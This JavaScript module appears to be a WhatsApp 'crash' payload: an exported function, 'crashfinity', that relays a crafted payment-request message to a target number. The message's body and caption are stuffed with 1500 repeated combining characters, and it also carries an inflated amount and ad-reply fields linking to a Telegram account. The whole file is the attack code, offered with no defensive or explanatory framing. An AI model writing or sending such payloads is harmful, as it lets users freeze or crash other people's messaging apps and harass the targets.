async function crashfinity(sock, target) {
  const titleText = "HAI SALAM KENAL YAKK";
  const spamText = "ြ".repeat(1500);
  const payload = {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      requestFrom: target,
      expiryTimestamp: Date.now() + 8000,
      amount: { value: 999999999, offset: 100, currencyCode: "IDR" },
      contextInfo: {
        externalAdReply: {
          title: titleText,
          body: spamText,
          mimetype: "audio/mpeg",
          caption: spamText,
          showAdAttribution: true,
          sourceUrl: "https://t.me/zuckyyu",
          thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
        }
      }
    }
  };
  await sock.relayMessage(target, payload, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}
module.exports = { crashfinity };
